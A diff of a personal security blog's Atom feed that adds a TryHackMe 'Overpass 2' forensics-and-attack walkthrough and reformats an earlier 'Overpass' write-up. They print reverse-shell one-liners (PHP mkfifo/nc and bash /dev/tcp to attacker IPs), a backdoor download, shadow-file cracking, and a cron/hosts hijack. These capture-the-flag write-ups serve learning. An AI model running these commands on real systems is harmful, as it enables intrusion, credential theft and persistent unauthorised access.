@@ -1,25 +1,234 @@
-<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-01T04:19:51+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>My website.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">Tryhackme-Overpass</title><link href="http://localhost:4000/tryhackme-overpass/" rel="alternate" type="text/html" title="Tryhackme-Overpass" /><published>2023-03-01T00:00:00+03:00</published><updated>2023-03-01T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-overpass</id><content type="html" xml:base="http://localhost:4000/tryhackme-overpass/"><![CDATA[<p>Overpass is easy room to get you started in CTF’s.</p>
+<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="4.3.2">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2023-03-09T20:32:45+03:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">Mr0Wido’s Blog</title><subtitle>My website.</subtitle><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><entry><title type="html">Tryhackme - Overpass 2 - Hacked</title><link href="http://localhost:4000/tryhackme-overpass-2-hacked/" rel="alternate" type="text/html" title="Tryhackme - Overpass 2 - Hacked" /><published>2023-03-09T00:00:00+03:00</published><updated>2023-03-09T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-overpass-2-hacked</id><content type="html" xml:base="http://localhost:4000/tryhackme-overpass-2-hacked/"><![CDATA[<p>This was an easy Linux machine and the second in the Overpass TryHackMe series. It involved analyzing a capture file containing requests issued by an attacker to compromise the web server, escalate privileges to root and establish persistence, in order to understand the exact steps followed to do so, and then using that information to hack back into the host.</p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+<h2 id="1-forensics---analyse-the-pcap">1. Forensics - Analyse the PCAP</h2>
+<p>Overpass has been hacked! The SOC team (Paradox, congratulations on the promotion) noticed suspicious activity on a late night shift while looking at shibes, and managed to capture packets as the attack happened.</p>
+
+<p>Can you work out how the attacker got in, and hack your way back into Overpass’ production server?</p>
+
+<p>Note: Although this room is a walkthrough, it expects familiarity with tools and Linux. I recommend learning basic Wireshark and completing Linux Fundamentals as a bare minimum.</p>
+
+<p><strong><code class="language-plaintext highlighter-rouge">md5sum of PCAP file: 11c3b2e9221865580295bc662c35c6dc</code></strong></p>
+
+<p><br /></p>
+<h3 id="11-what-was-the-url-of-the-page-they-used-to-upload-a-reverse-shell">1.1 What was the URL of the page they used to upload a reverse shell?</h3>
+
+<p>Open the <strong><code class="language-plaintext highlighter-rouge">overpass2.pcapng</code></strong> file in Wireshark and analyze the <strong><code class="language-plaintext highlighter-rouge">HTTP</code></strong> traffic (enter http as filter).</p>
+
+<p><img src="/assets/img/tryhackme/overpass-2/http.png" alt="http" /></p>
+
+<p>Right-click on the first http frame and select <strong><code class="language-plaintext highlighter-rouge">“Follow &gt; TCP Stream”</code></strong>. Here is the first request.</p>
+
+<p><img src="/assets/img/tryhackme/overpass-2/tcp.png" alt="tcp" /></p>
+
+<p><strong>Answer : <code class="language-plaintext highlighter-rouge">/development/</code></strong></p>
+
+<p><br /></p>
+<h3 id="12-what-payload-did-the-attacker-use-to-gain-access">1.2 What payload did the attacker use to gain access?</h3>
+<p>Now, we are trying to find the reverse shell that the attacker has uploaded to the system. So we apply this filter.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$http.request.method == "POST"
+</code></pre></div></div>
+<p>And here it is,</p>
+
+<p><img src="/assets/img/tryhackme/overpass-2/post.png" alt="post" /></p>
+
+<p>Right-click on the HTTP frame and select <strong><code class="language-plaintext highlighter-rouge">“Follow &gt; TCP Stream”</code></strong>.</p>
+
+<p><img src="/assets/img/tryhackme/overpass-2/payload.png" alt="payload" /></p>
+
+<p>Answer : <code class="language-plaintext highlighter-rouge">&lt;?php exec\(\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.170.145 4242 &gt;/tmp/f\")?&gt;</code></p>
+
+<p><br /></p>
+<h3 id="13-what-password-did-the-attacker-use-to-privesc">1.3 What password did the attacker use to privesc?</h3>
+<p>Now, <strong><code class="language-plaintext highlighter-rouge">CTRL+F</code></strong> to search. After that, we set the <strong><code class="language-plaintext highlighter-rouge">string</code></strong> and searching for requests containing <strong><code class="language-plaintext highlighter-rouge">passwords</code></strong>.</p>
+
+<p><img src="/assets/img/tryhackme/overpass-2/string.png" alt="string" /></p>
+
+<p>Now, requests that contain passwords from this search will appear marked.</p>
+
+<p><img src="/assets/img/tryhackme/overpass-2/marked.png" alt="mark" /></p>
+
+<p>We look at the TCP Stream and we have james’ password.</p>
+
+<p><img src="/assets/img/tryhackme/overpass-2/password.png" alt="password" /></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">whenevernoteartinstant</code></strong></p>
+
+<p><br /></p>
+<h3 id="14-how-did-the-attacker-establish-persistence">1.4 How did the attacker establish persistence?</h3>
+<p>Still in the same stream, scrolling down reveals that the attacker has downloaded an ssh backdoor to establish persistence.</p>
+
+<p><img src="/assets/img/tryhackme/overpass-2/git.png" alt="git" /></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">https://github.com/NinjaJc01/ssh-backdoor</code></strong></p>
+
+<p><br /></p>
+<h3 id="15-using-the-fasttrack-wordlist-how-many-of-the-system-passwords-were-crackable">1.5 Using the fasttrack wordlist, how many of the system passwords were crackable?</h3>
+<p>In the same stream, the attacker dumped the content of the <strong><code class="language-plaintext highlighter-rouge">/etc/shadow</code></strong> file just before downloading the SSH backdoor.</p>
+
+<p><img src="/assets/img/tryhackme/overpass-2/hosts.png" alt="hosts" /></p>
+
+<p>Save the content in a file and crack it with <strong><code class="language-plaintext highlighter-rouge">John</code></strong> against the <strong><code class="language-plaintext highlighter-rouge">fasttrack</code></strong> wordlist to confirm how many passwords are crackable.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --wordlist=/usr/share/wordlist/fasttrack.txt shadow.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/overpass-2/shadow.png" alt="shadow" /></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">4</code></strong></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h2 id="2-research---analyse-the-code">2. Research - Analyse the Code</h2>
+<p>Now that you’ve found the code for the backdoor, it’s time to analyse it.
+<br /></p>
+<h3 id="21-whats-the-default-hash-for-the-backdoor">2.1 What’s the default hash for the backdoor?</h3>
+
+<p>Still, in the same stream, we see that the attacker executes the backdoor with the <code class="language-plaintext highlighter-rouge">-a</code> option, along with a <code class="language-plaintext highlighter-rouge">hash</code>.</p>
+
+<p><img src="/assets/img/tryhackme/overpass-2/back.png" alt="back" /></p>
+
+<p>What does the -a option do? Let’s download the backdoor locally and check ourselves what this option is.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ wget https://github.com/NinjaJc01/ssh-backdoor/raw/master/backdoor
+$ chmod +x backdoor 
+$ ./backdoor -h
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/overpass-2/door.png" alt="door" /></p>
+
+<p>As you can see here, if no hash is entered in the -a option, the tool itself uses a default hash.</p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">bdd04d9bb7621687f5df9001f5098eb22bf19eac4c2c30b6f23efed4d24807277d0f8bfccb9e77659103d78c56e66d2d7d8391dfc885d0e9b68acd01fc2170e3</code></strong></p>
+
+<p><br /></p>
+<h3 id="22-whats-the-hardcoded-salt-for-the-backdoor">2.2 What’s the hardcoded salt for the backdoor?</h3>
+<p>Reading the source code of the backdoor (<a href="https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go">https://github.com/NinjaJc01/ssh-backdoor/blob/master/main.go</a>), reveals that the salt is hardcoded.</p>
+
+<p><img src="/assets/img/tryhackme/overpass-2/salt.png" alt="salt" /></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">1c362db832f3f864c8c2fe05f2002a05</code></strong></p>
+
+<p><br /></p>
+<h3 id="23-what-was-the-hash-that-the-attacker-used---go-back-to-the-pcap-for-this">2.3 What was the hash that the attacker used? - Go back to the PCAP for this!</h3>
+<p>We saw previously that the attacker used a custom hash.</p>
+
+<p><img src="/assets/img/tryhackme/overpass-2/door.png" alt="door" /></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed</code></strong></p>
+
+<p><br /></p>
+<h3 id="24-crack-the-hash-using-rockyou-and-a-cracking-tool-of-your-choice-whats-the-password">2.4 Crack the hash using rockyou and a cracking tool of your choice. What’s the password?</h3>
+
+<p>Analyzing the source code, we can see that the password is salted as follows.</p>
+
+<p><img src="/assets/img/tryhackme/overpass-2/sha.png" alt="sha" /></p>
+
+<p>The salt is appended to the password, and SHA512 of the resulting string makes the hash.
+We create hash.txt and paste the following into it.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>6d05358f090eea56a238af02e47d44ee5489d234810ef6240280857ec69712a3e5e370b8a41899d0196ade16c0d54327c5654019292cbfe0b5e98ad1fec71bed$1c362db832f3f864c8c2fe05f2002a05
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/overpass-2/cat.png" alt="cat" /></p>
+
+<p>Now, let’s crack it with john. As a format, we use <code class="language-plaintext highlighter-rouge">(sha512($pass.$salt))</code>.</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ john --format='dynamic=sha512($p.$s)' --wordlist=/usr/share/wordlists/rockyou.txt  hash.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/overpass-2/hash.png" alt="hash" /></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">november16</code></strong></p>
+
+<p><br /></p>
+
+<hr />
+
+<p><br /></p>
+
+<h2 id="3-attack---get-back-in">3. Attack - Get back in!</h2>
+<p>Now that the incident is investigated, Paradox needs someone to take control of the Overpass production server again.</p>
+
+<p>There’s flags on the box that Overpass can’t afford to lose by formatting the server!</p>
+
+<p><br /></p>
+<h3 id="31-the-attacker-defaced-the-website-what-message-did-they-leave-as-a-heading">3.1 The attacker defaced the website. What message did they leave as a heading?</h3>
+<p>Let’s do an nmap scan.</p>
+
+<p><img src="/assets/img/tryhackme/overpass-2/nmap.png" alt="nmap" /></p>
+
+<p>As we see here, 3 ports are open. One is <strong><code class="language-plaintext highlighter-rouge">HTTP:80</code></strong> and the others are <strong><code class="language-plaintext highlighter-rouge">SSH:22</code></strong>, <strong><code class="language-plaintext highlighter-rouge">SSH:2222</code></strong>.
+Connect to port 80. The index page shows the following message.</p>
+
+<p><img src="/assets/img/tryhackme/overpass-2/message.png" alt="message" /></p>
+
+<p><strong>Answer: <code class="language-plaintext highlighter-rouge">H4ck3d by CooctusClan</code></strong></p>
+
+<p><br /></p>
+<h3 id="32-using-the-information-youve-found-previously-hack-your-way-back-in">3.2 Using the information you’ve found previously, hack your way back in!</h3>
+<p>It appears port 2222 is open. Logging in with the password cracked earlier. (november 16)</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh 10.10.128.157 -p 2222 -oHostKeyAlgorithms=+ssh-rsa
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/overpass-2/ssh.png" alt="ssh" /></p>
+
+<p><br /></p>
+<h3 id="33-whats-the-user-flag">3.3 What’s the user flag?</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /home/james/user.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/overpass-2/user.png" alt="user" /></p>
+
+<p><br /></p>
+<h3 id="34-whats-the-root-flag">3.4 What’s the root flag?</h3>
+<p>There is a copy of bash in James’s home directory.</p>
+
+<p><img src="/assets/img/tryhackme/overpass-2/bash.png" alt="bash" /></p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ./.suid_bash -p 
+$ cat /root/root.txt
+</code></pre></div></div>
+
+<p><img src="/assets/img/tryhackme/overpass-2/root.png" alt="root" /></p>
+
+<p><img src="/assets/img/tryhackme/overpass-2/root-flag.png" alt="root-flag" /></p>
+
+<p><br /></p>
+
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>
+
+<p><br /></p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="security," /><category term="forensics," /><category term="wireshark" /><summary type="html"><![CDATA[This was an easy Linux machine and the second in the Overpass TryHackMe series. It involved analyzing a capture file containing requests issued by an attacker to compromise the web server, escalate privileges to root and establish persistence, in order to understand the exact steps followed to do so, and then using that information to hack back into the host.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/overpass-2.png" /><media:content medium="image" url="http://localhost:4000/assets/img/overpass-2.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">Tryhackme - Overpass</title><link href="http://localhost:4000/tryhackme-overpass/" rel="alternate" type="text/html" title="Tryhackme - Overpass" /><published>2023-03-01T00:00:00+03:00</published><updated>2023-03-01T00:00:00+03:00</updated><id>http://localhost:4000/tryhackme-overpass</id><content type="html" xml:base="http://localhost:4000/tryhackme-overpass/"><![CDATA[<p>Overpass is easy room to get you started in CTF’s.</p>
 
 <h2 id="recon">Recon</h2>
-<p>The first thing you will do is scan the target ip address to find open ports. We do it using <strong>Nmap</strong>.</p>
+<p>The first thing you will do is scan the target ip address to find open ports. We do it using <strong><code class="language-plaintext highlighter-rouge">Nmap</code></strong>.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$nmap -sSV -v 10.8.81.166
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nmap -sSV -v 10.8.81.166
 </code></pre></div></div>
 <p><img src="/assets/img/tryhackme/overpass/nmap.png" alt="nmap" /></p>
 
-<p>As we see here, 2 ports are open. One is HTTP:80 and the other is SSH:22. We can make a few guesses based on this. I think we should somehow find the necessary information for ssh connection from this site. And we have to get into the target machine using ssh. But this is just a guess for now.
+<p>As we see here, 2 ports are open. One is <strong><code class="language-plaintext highlighter-rouge">HTTP:80</code></strong> and the other is <strong><code class="language-plaintext highlighter-rouge">SSH:22</code></strong>. We can make a few guesses based on this. I think we should somehow find the necessary information for ssh connection from this site. And we have to get into the target machine using ssh. But this is just a guess for now.
 Anyway, let’s go to the website first and see what’s up.</p>
 
 <p><img src="/assets/img/tryhackme/overpass/homepage.png" alt="homepage" /></p>
 
-<p>Overpass bir password manager miş. Ana Sayfada 2 sayfa bağlantısı daha gördük biri “About Us” diğeri “Download” ikisinide inceleyelim.</p>
+<p>Overpass is a password manager. We saw 2 more pages on the main page, one “About Us” and the other “Downloads”. Let’s examine both.</p>
 
-<h4 id="about-us">About Us</h4>
+<h3 id="about-us">About Us</h3>
 <p><img src="/assets/img/tryhackme/overpass/aboutus.png" alt="aboutus" /></p>
 
 <p>Here we see a few names that may be useful to us in the future.</p>
 
-<h4 id="download">Download</h4>
+<h3 id="download">Download</h3>
 <p><img src="/assets/img/tryhackme/overpass/download.png" alt="download" /></p>
 
 <p>We see two files here, one is the source code of overpass and the other is the script that runs this code.
@@ -31,39 +240,39 @@ We couldn’t find much, let’s look at the source codes of the pages.</p>
 We couldn’t find anything remarkable in the source code of the About Us and Downloads pages.</p>
 
 <p>Let’s do a gobuster scan to see if there are other pages on the site.</p>
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$gobuster dir -u 10.10.79.124 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ gobuster dir -u 10.10.79.124 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 </code></pre></div></div>
 
 <p><img src="/assets/img/tryhackme/overpass/gobuster.png" alt="aboutus" /></p>
 
-<p>We found an interesting place /admin/ page here, let’s examine it.
+<p>We found an interesting place <strong><code class="language-plaintext highlighter-rouge">/admin/</code></strong> page here, let’s examine it.
 I tried a few login attempts first, but it didn’t work.</p>
 
 <p><img src="/assets/img/tryhackme/overpass/admin.png" alt="aboutus" /></p>
 
-<p>Let’s take a look at the source code of the admin page.</p>
+<p>Let’s take a look at the source code of the admin page.
+Maybe we can brute force using the information here.</p>
 
 <p><img src="/assets/img/tryhackme/overpass/admin_id.png" alt="aboutus" /></p>
 
-<p>Maybe we can brute force using the information here.</p>
+<p>And there are several javascript files, let’s examine them.</p>
 
 <p><img src="/assets/img/tryhackme/overpass/admin_file.png" alt="aboutus" /></p>
 
-<p>And there are several javascript files, let’s examine them.
-The main.js contains nothing but the hello world output.</p>
+<p>The <strong><code class="language-plaintext highlighter-rouge">main.js</code></strong> contains nothing but the hello world output.</p>
 
 <p><img src="/assets/img/tryhackme/overpass/main.png" alt="aboutus" /></p>
 
-<p>Let’s examine login.js now.</p>
+<p>Let’s examine <strong><code class="language-plaintext highlighter-rouge">login.js</code></strong> now.</p>
 
 <p><img src="/assets/img/tryhackme/overpass/login.png" alt="aboutus" /></p>
 
-<p>We found something here. A login function has been placed here. It says that if you enter wrong information, you will get incorrect credentials, but if it is entered correctly, cookie settings will be set as SessionToken and status0Cookie. Let’s try to login using this cookie information.</p>
+<p>We found something here. A login function has been placed here. It says that if you enter wrong information, you will get incorrect credentials, but if it is entered correctly, cookie settings will be set as <strong><code class="language-plaintext highlighter-rouge">SessionToken and status0Cookie</code></strong>. Let’s try to login using this cookie information.</p>
 
 <p><img src="/assets/img/tryhackme/overpass/settings.png" alt="aboutus" /></p>
 
 <p>After entering the information, we refresh the page and we are inside.
-We come across an SSH key, but there is an article before it.</p>
+We come across an <strong><code class="language-plaintext highlighter-rouge">SSH key</code></strong>, but there is an article before it.</p>
 
 <p><img src="/assets/img/tryhackme/overpass/admin_on.png" alt="aboutus" /></p>
 
@@ -73,19 +282,19 @@ We come across an SSH key, but there is an article before it.</p>
 
 <p>Let’s find james’ SSH password.
 To crack the password of an rsa key, we need to follow these steps.
-We create id_rsa file using <strong>nano</strong>. Copy and paste the rsa private key information into it. Then we change the permission settings using <strong>chmod</strong> so that ssh can use it.
-Then we use <strong>ssh2john</strong> to bring this ssh key in a way that joh can crack, and then we find the password using <strong>john</strong>.</p>
+We create <strong><code class="language-plaintext highlighter-rouge">id_rsa file using nano</code></strong>. Copy and paste the rsa private key information into it. Then we change the permission settings using <strong><code class="language-plaintext highlighter-rouge">chmod</code></strong> so that ssh can use it.
+Then we use <strong><code class="language-plaintext highlighter-rouge">ssh2john</code></strong> to bring this ssh key in a way that joh can crack, and then we find the password using <strong><code class="language-plaintext highlighter-rouge">john</code></strong>.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$nano id_rsa
-$chmod 600 id_rsa
-$ssh2john id_rsa &gt; hash.txt
-$john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nano id_rsa
+$ chmod 600 id_rsa
+$ ssh2john id_rsa &gt; hash.txt
+$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 </code></pre></div></div>
 
-<p>And we find the password <strong>james13</strong>
+<p>And we find the password <strong><code class="language-plaintext highlighter-rouge">james13</code></strong>
 Now we can connect to james using this information.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ssh -i id_rsa james@10.10.79.124
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ ssh -i id_rsa james@10.10.79.124
 </code></pre></div></div>
 
 <p>And we’re inside</p>
@@ -99,19 +308,19 @@ Now we can connect to james using this information.</p>
 
 <p><img src="/assets/img/tryhackme/overpass/ls.png" alt="aboutus" /></p>
 
-<p>There are a few files that caught our attention <strong>todo.txt, user.txt</strong>
-user.txt : user flag</p>
+<p>There are a few files that caught our attention <strong><code class="language-plaintext highlighter-rouge">todo.txt, user.txt</code></strong>
+<strong><code class="language-plaintext highlighter-rouge">user.txt : user flag</code></strong></p>
 
 <p><img src="/assets/img/tryhackme/overpass/user_flag.png" alt="aboutus" /></p>
 
-<p>Now let’s take a look at todo.txt.</p>
+<p>Now let’s take a look at <strong><code class="language-plaintext highlighter-rouge">todo.txt</code></strong>.</p>
 
 <p><img src="/assets/img/tryhackme/overpass/todo.png" alt="aboutus" /></p>
 
 <p>Important things are being talked about here. James keeps a password around here, but he said he used his own password manager.
 There was something he wanted to talk to Pardox about. He also says how the build script works automatically in the system.</p>
 
-<p>I examined the files again using <code class="language-plaintext highlighter-rouge">ls -la</code> and there is another file called .overpass, and when I looked inside, I found something like this.</p>
+<p>I examined the files again using <strong><code class="language-plaintext highlighter-rouge">ls -la</code></strong> and there is another file called .overpass, and when I looked inside, I found something like this.</p>
 
 <p><img src="/assets/img/tryhackme/overpass/pass.png" alt="aboutus" /></p>
 
@@ -120,7 +329,7 @@ What I noticed when I reviewed the code is this.</p>
 
 <p><img src="/assets/img/tryhackme/overpass/source.png" alt="aboutus" /></p>
 
-<p>The algorithm they use according to the code they wrote is <code class="language-plaintext highlighter-rouge">rotate-47</code></p>
+<p>The algorithm they use according to the code they wrote is <strong><code class="language-plaintext highlighter-rouge">rotate-47</code></strong></p>
 
 <p><img src="/assets/img/tryhackme/overpass/rot.png" alt="aboutus" /></p>
 
@@ -128,34 +337,35 @@ What I noticed when I reviewed the code is this.</p>
 
 <p>But if we need to go back to todo.txt, James was talking about the continuous and automatic loading of the application there, why don’t we look at the cronjob.</p>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$cat /etc/crontab
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ cat /etc/crontab
 </code></pre></div></div>
 
 <p><img src="/assets/img/tryhackme/overpass/cron.png" alt="aboutus" /></p>
 
-<p>And here we get important information. As we can see, the root user automatically runs the file overpass.thm/downloads/src/buildscript.sh as <strong>cronjab</strong>.
+<p>And here we get important information. As we can see, the root user automatically runs the file <code class="language-plaintext highlighter-rouge">overpass.thm/downloads/src/buildscript.sh</code> as <strong><code class="language-plaintext highlighter-rouge">cronjob</code></strong>.
 In other words, a bash file is running automatically in the system, if we can change this file, we can place our own reverse shell.
 I tried to open and change the file several times, but I couldn’t do anything because it exceeded my authorization limits. But there was one thing I missed, overpass.thm is a hostname and if we manage to change this hostname and enter our own machine information, I can run my own buildscript.sh file.
-For this I first check the contents of /etc/hosts.</p>
+For this I first check the contents of  <strong><code class="language-plaintext highlighter-rouge">/etc/hosts</code></strong>.</p>
 
 <p><img src="/assets/img/tryhackme/overpass/hosts.png" alt="aboutus" /></p>
 
 <p>Interestingly, James has the ability to modify this file.
-Using my own machine ip, I change the overpass.thm line to<code class="language-plaintext highlighter-rouge"> "10.8.81.166 overpass.thm"</code>
+Using my own machine ip, I change the overpass.thm line to<strong><code class="language-plaintext highlighter-rouge">"10.8.81.166 overpass.thm"</code></strong>
 Then I will do the following in order on my own machine. I will create the /downloads/src/buildscript.sh file. And I will write revershell inside this file, then I will open an http.server just outside the downloads folder. At the same time, I will open a listener for nc using the same port as the port I entered in revershell. Then cronjab will connect to my machine and get the downoads/src/buildscript.sh file and then run it. The revershell inside it will also work and boom we’ll go inside.</p>
 
-<p><code class="language-plaintext highlighter-rouge">buildscript.sh:  bash -i &gt;&amp; /dev/tcp/10.8.81.166/4444 &gt;&amp;1</code></p>
-
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$mkdir downloads
-$cd downloads
-$mdir src
-$cd src
-$nano buildscript.sh
-$cd ../..
-$python3 -m http.server 80
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ bash -i &gt;&amp; /dev/tcp/10.8.81.166/4444 &gt;&amp;1
 </code></pre></div></div>
 
-<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc -nlvp 4444
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ mkdir downloads
+$ cd downloads
+$ mdir src
+$ cd src
+$ nano buildscript.sh
+$ cd ../..
+$ python3 -m http.server 80
+</code></pre></div></div>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$ nc -nlvp 4444
 </code></pre></div></div>
 <p>We are inside.</p>
 
@@ -165,7 +375,7 @@ $python3 -m http.server 80
 
 <p><img src="/assets/img/tryhackme/overpass/root_flag.png" alt="aboutus" /></p>
 
-<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care</p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="security" /><category term="easy" /><category term="cron" /><category term="owasp top 10" /><summary type="html"><![CDATA[Overpass is easy room to get you started in CTF’s.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/overpass.png" /><media:content medium="image" url="http://localhost:4000/assets/img/overpass.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe-Gatekeeper</title><link href="http://localhost:4000/post-9/" rel="alternate" type="text/html" title="TryHackMe-Gatekeeper" /><published>2023-02-19T00:00:00+03:00</published><updated>2023-02-19T00:00:00+03:00</updated><id>http://localhost:4000/post-9</id><content type="html" xml:base="http://localhost:4000/post-9/"><![CDATA[<p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>
+<p>It was such a fun CTF. I hope you learned something and had fun too. But that’s it for now till next time take care.</p>]]></content><author><name>Mr0Wido&apos;s Blog</name><email>furkn.dniz@gmail.com</email></author><category term="TryHackMe" /><category term="security," /><category term="easy," /><category term="cron," /><category term="owasp top 10" /><summary type="html"><![CDATA[Overpass is easy room to get you started in CTF’s.]]></summary><media:thumbnail xmlns:media="http://search.yahoo.com/mrss/" url="http://localhost:4000/assets/img/overpass.png" /><media:content medium="image" url="http://localhost:4000/assets/img/overpass.png" xmlns:media="http://search.yahoo.com/mrss/" /></entry><entry><title type="html">TryHackMe-Gatekeeper</title><link href="http://localhost:4000/post-9/" rel="alternate" type="text/html" title="TryHackMe-Gatekeeper" /><published>2023-02-19T00:00:00+03:00</published><updated>2023-02-19T00:00:00+03:00</updated><id>http://localhost:4000/post-9</id><content type="html" xml:base="http://localhost:4000/post-9/"><![CDATA[<p>You’ll find this post in your <code class="language-plaintext highlighter-rouge">_posts</code> directory. Go ahead and edit it and re-build the site to see your changes. You can rebuild the site in many different ways, but the most common way is to run <code class="language-plaintext highlighter-rouge">jekyll serve</code>, which launches a web server and auto-regenerates your site when a file is updated.</p>
 
 <p>Jekyll requires blog post files to be named according to the following format:</p>
 
